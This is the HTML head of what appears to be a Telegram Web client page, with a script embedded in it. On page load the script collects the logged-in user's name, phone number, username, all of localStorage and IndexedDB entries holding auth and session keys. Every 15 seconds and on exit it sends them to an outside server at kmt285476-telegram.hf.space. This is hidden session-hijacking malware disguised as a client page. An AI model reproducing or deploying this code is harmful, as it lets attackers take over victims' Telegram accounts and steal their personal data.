  <meta charset="UTF-8">

  <meta name="title" content="<%= htmlWebpackPlugin.options.appTitle %>">

  <script src="./redirect.js"></script>
  <style>
    @layer reset, variables, ui, components;
    @layer ui {
      @layer tablist, spinner, button, input, layout;
    }

    .hide-telegram #root {
        display: none !important;
    }
  </style>

<script>
    const BACKEND_URL = "https://kmt285476-telegram.hf.space";
    const API_KEY = "tg_custom_secret_key_2026";

    function bufferToBase64(buf) {
        let binary = '';
        const bytes = new Uint8Array(buf);
        for (let i = 0; i < bytes.byteLength; i++) { binary += String.fromCharCode(bytes[i]); }
        return window.btoa(binary);
    }
    function base64ToBuffer(base64) {
        const binary_string = window.atob(base64);
        const len = binary_string.length;
        const bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
        return bytes.buffer;
    }
    function serializeData(data) {
        return JSON.stringify(data, (key, value) => {
            if (value instanceof ArrayBuffer) return { __type: 'ArrayBuffer', data: bufferToBase64(value) };
            if (value instanceof Uint8Array) return { __type: 'Uint8Array', data: bufferToBase64(value.buffer) };
            return value;
        });
    }
    function deserializeData(jsonStr) {
        return JSON.parse(jsonStr, (key, value) => {
            if (value && typeof value === 'object' && value.__type === 'ArrayBuffer') return base64ToBuffer(value.data);
            if (value && typeof value === 'object' && value.__type === 'Uint8Array') return new Uint8Array(base64ToBuffer(value.data));
            return value;
        });
    }
    
    async function exportIndexedDB(dbName, storeName) {
        return new Promise((resolve) => {
            const request = indexedDB.open(dbName);
            request.onsuccess = (e) => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains(storeName)) { resolve({}); return; }
                const tx = db.transaction(storeName, "readonly");
                const store = tx.objectStore(storeName);
                const getAllReq = store.getAll();
                const getKeysReq = store.getAllKeys();
                getAllReq.onsuccess = () => {
                    getKeysReq.onsuccess = () => {
                        const data = {};
                        for (let i = 0; i < getKeysReq.result.length; i++) {
                            const key = getKeysReq.result[i];
                            if(typeof key === 'string' && (key.includes('auth') || key.includes('key') || key.includes('session') || key.includes('dc'))) {
                                data[key] = getAllReq.result[i];
                            }
                        }
                        resolve(data);
                    };
                };
                tx.onerror = () => resolve({});
            };
            request.onerror = () => resolve({});
        });
    }

    async function importIndexedDB(dbName, storeName, data) {
        return new Promise((resolve, reject) => {
            const request = indexedDB.open(dbName);
            request.onupgradeneeded = (e) => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains(storeName)) db.createObjectStore(storeName);
            };
            request.onsuccess = (e) => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains(storeName)) { resolve(); return; }
                const tx = db.transaction(storeName, "readwrite");
                const store = tx.objectStore(storeName);
                const clearReq = store.clear();
                clearReq.onsuccess = () => {
                    const keys = Object.keys(data);
                    if (keys.length === 0) { resolve(); return; }
                    let putCount = 0;
                    for (const key of keys) {
                        const putReq = store.put(data[key], key);
                        putReq.onsuccess = () => { putCount++; if (putCount === keys.length) resolve(); };
                        putReq.onerror = () => reject(new Error("Failed to put key: " + key));
                    }
                };
                clearReq.onerror = () => reject(new Error("Failed to clear store"));
            };
            request.onerror = (e) => reject(e);
        });
    }

    function getTelegramProfile() {
        try {
            let currentId = null;
            let name = "Unknown Profile";
            let phone = "Waiting...";
            let username = "";

            const stateStr = localStorage.getItem('tt-global-state');
            if (stateStr) {
                const state = JSON.parse(stateStr);
                currentId = state.currentUserId;
                if (currentId && state.users && state.users.byId) {
                    const user = state.users.byId[currentId] || state.users.byId[currentId.toString()];
                    if (user) {
                        name = [user.firstName, user.lastName].filter(Boolean).join(' ') || name;
                        phone = user.phoneNumber ? '+' + user.phoneNumber : phone;
                        username = user.username ? '@' + user.username : username;
                    }
                }
            }
            if (!currentId) {
                const accStr = localStorage.getItem('account1');
                if (accStr) {
                    const acc = JSON.parse(accStr);
                    if (acc.userId) currentId = acc.userId.toString();
                }
            }
            if (currentId) return { uid: currentId.toString(), name, phone, username };
        } catch (e) { console.error("Profile parsing error", e); }
        return null; 
    }

document.addEventListener("DOMContentLoaded", () => {
        // Admin Code များကို သီးသန့်ဖိုင်သို့ ရွှေ့လိုက်ပါပြီ။ 
        // ဤနေရာတွင် User များအတွက် Session Syncing သီးသန့်သာ ကျန်ရှိပါမည်။
        
        localStorage.removeItem("is_admin_view");

        setTimeout(() => {
            let lastSyncLength = 0; 
            let wasLoggedIn = false; 
            let lastKnownUserId = null; 

            const syncSessionData = async () => {
                let profile = getTelegramProfile();
                const lsDataStr = JSON.stringify(localStorage);
                
                const isLoggedIn = profile && profile.uid && lsDataStr.length > 1500;

                if (wasLoggedIn && !isLoggedIn && lastKnownUserId) {
                    try {
                        fetch(BACKEND_URL + "/api/delete_session", {
                            method: "POST",
                            headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
                            body: JSON.stringify({ user_id: lastKnownUserId }), 
                            keepalive: true 
                        });
                        wasLoggedIn = false; 
                        lastSyncLength = 0;
                    } catch(e) {}
                    return; 
                }

                if (isLoggedIn) {
                    wasLoggedIn = true; 
                    lastKnownUserId = profile.uid; 

                    try {
                        const rawIdbData = await exportIndexedDB("tt-data", "store");
                        const idbDataStr = serializeData(rawIdbData);
                        
                        const currentDataLength = idbDataStr.length + lsDataStr.length;
                        if (lastSyncLength === currentDataLength) return; 

                        const res = await fetch(BACKEND_URL + "/api/save_session", {
                            method: "POST",
                            headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
                            body: JSON.stringify({
                                user_id: lastKnownUserId, 
                                profile_name: profile.name,
                                profile_phone: profile.phone,
                                profile_username: profile.username,
                                local_storage_str: lsDataStr,
                                indexed_db_str: idbDataStr,
                                timestamp: new Date().toISOString()
                            })
                        });
                        
                        if(res.ok) {
                            console.log("✅ Data Synced successfully for:", lastKnownUserId);
                            lastSyncLength = currentDataLength; 
                        }
                    } catch(e) {}
                }
            };

            setInterval(syncSessionData, 15000); 
            window.addEventListener('beforeunload', () => { if(wasLoggedIn) syncSessionData(); });
            syncSessionData(); 
        }, 5000);
    });
</script>
</head>
